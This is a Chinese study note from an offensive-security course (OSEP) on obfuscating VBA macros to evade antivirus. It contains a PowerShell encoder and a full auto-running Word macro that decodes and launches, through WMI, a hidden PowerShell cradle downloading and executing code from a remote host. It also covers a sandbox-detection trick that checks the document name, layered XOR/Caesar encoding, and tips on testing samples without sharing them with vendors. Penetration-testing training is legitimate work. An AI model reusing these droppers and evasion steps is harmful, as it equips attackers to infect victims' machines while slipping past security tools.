---
title: OSEP-07-VBA高级混淆技术
description: '07-杀软绕过 | 06-VBA高级混淆技术'
pubDate: 2026-01-30T00:01:05+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
---

# VBA 高级混淆技术

## 概述

在前面的章节中，我们学习了基本的 VBA 混淆技术。本文介绍更高级的混淆方法，可以进一步降低检测率。

## Caesar 密码 + 十进制编码

### 原理

1. 将字符串转换为字符数组
2. 获取每个字符的 ASCII 值
3. 加上 Caesar 密钥（如 17）
4. 填充为 3 位数字
5. 连接成长数字字符串

### PowerShell 加密器

```powershell
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"

[string]$output = ""

$payload.ToCharArray() | %{
    # 获取 ASCII 值并加上密钥 17
    [string]$thischar = [byte][char]$_ + 17

    # 填充为 3 位数字
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}

# 复制到剪贴板
$output | clip

Write-Host "Encrypted payload:"
Write-Host $output
```

### 加密输出示例

```
129128136118131132121118125125049062118137118116049115138129114132132...
```

每 3 位数字代表一个加密后的字符。

### VBA 解密器

使用食物相关的函数名来降低签名检测：

```vba
' 解密单个字符：减去密钥 17，转换为字符
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

' 获取前 3 个字符
Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

' 移除前 3 个字符
Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

' 主解密函数
Function Nuts(Milk)
    Dim Oatmilk As String
    Oatmilk = ""

    Do
        ' 获取前 3 位，解密，添加到结果
        Oatmilk = Oatmilk + Pears(Strawberries(Milk))
        ' 移除已处理的 3 位
        Milk = Almonds(Milk)
    Loop While Len(Milk) > 0

    Nuts = Oatmilk
End Function
```

### 解密流程

```
输入: "129128136118131132..."

第 1 次循环:
  Strawberries("129...") → "129"
  Pears(129) → Chr(129-17) → Chr(112) → "p"
  Almonds("129...") → "128136118..."

第 2 次循环:
  Strawberries("128...") → "128"
  Pears(128) → Chr(128-17) → Chr(111) → "o"
  ...

最终结果: "powershell -exec bypass..."
```

## 完整加密宏示例

```vba
' 解密函数
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Dim Oatmilk As String
    Do
        Oatmilk = Oatmilk + Pears(Strawberries(Milk))
        Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

' 主函数
Function MyMacro()
    Dim Apples As String
    Dim Water As String

    ' 加密的 PowerShell 命令
    Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063066066074063066067065064115128128124063133137133056058058"

    ' 解密
    Water = Nuts(Apples)

    ' 使用 WMI 执行（也是加密的）
    ' "winmgmts:" = "136122127126120126133132075"
    ' "Win32_Process" = "104122127068067112097131128116118132132"
    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub
```

## 启发式检测绕过

### 文档名检测

杀软模拟执行时通常会重命名文档。检测文档名可以判断是否在模拟器中：

```vba
Function MyMacro()
    ' 检查文档名是否被修改
    ' "runner.doc" 加密后 = "131134127127118131063117128116"
    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
        Exit Function
    End If

    ' 正常执行...
End Function
```

### 工作原理

```
正常执行:
  ActiveDocument.Name = "runner.doc"
  检查通过 → 执行恶意代码

模拟器执行:
  ActiveDocument.Name = "temp_12345.doc" (被重命名)
  检查失败 → 退出，不执行
```

## 检测率对比

| 技术组合 | 检测率 |
|----------|--------|
| 原始 VBA | 7/26 |
| + StrReverse | 4/26 |
| + Caesar + 十进制 | 2/26 |
| + 文档名检测 | 1/26 |

## 其他混淆技术

### 1. 字符串拆分

```vba
' 原始
str = "powershell"

' 混淆
str = "pow" & "er" & "sh" & "ell"
```

### 2. Chr 函数

```vba
' 原始
str = "cmd"

' 混淆
str = Chr(99) & Chr(109) & Chr(100)
```

### 3. 环境变量

```vba
' 使用环境变量构建路径
path = Environ("COMSPEC")  ' 返回 C:\Windows\system32\cmd.exe
```

### 4. 随机变量名

```vba
' 使用无意义的变量名
Dim a1b2c3d4 As String
Dim x9y8z7w6 As Long
Dim qwerty123 As Variant
```

### 5. 添加垃圾代码

```vba
Sub MyMacro()
    Dim unused1 As Integer
    unused1 = 42

    ' 无用的循环
    For i = 1 To 10
        unused1 = unused1 + 1
    Next i

    ' 实际代码
    ...
End Sub
```

## 多层加密

### 示例：XOR + Caesar

```vba
' 第一层：XOR 解密
Function XorDecrypt(data, key)
    Dim result As String
    For i = 1 To Len(data)
        result = result & Chr(Asc(Mid(data, i, 1)) Xor key)
    Next i
    XorDecrypt = result
End Function

' 第二层：Caesar 解密
Function CaesarDecrypt(data, shift)
    Dim result As String
    For i = 1 To Len(data)
        result = result & Chr(Asc(Mid(data, i, 1)) - shift)
    Next i
    CaesarDecrypt = result
End Function

' 使用
payload = CaesarDecrypt(XorDecrypt(encrypted, 0xAB), 17)
```

## 最佳实践

### 1. 组合多种技术

单一技术容易被检测，组合使用效果更好：

```
加密 + 混淆 + 启发式绕过 + WMI 解链
```

### 2. 自定义加密算法

不要使用公开的加密方法，自己设计简单但独特的算法。

### 3. 定期测试

杀软规则会更新，定期测试并调整混淆方法。

### 4. 避免上传样本

不要将样本上传到 VirusTotal，使用 AntiScan.Me 等不分享样本的服务。

### 5. 匹配目标环境

确保混淆后的代码在目标环境中正常工作。

## 练习

1. 使用提供的 PowerShell 加密器加密自己的 payload
2. 实现 VBA 解密器并测试
3. 添加文档名检测绕过启发式分析
4. 测试不同杀软的检测率
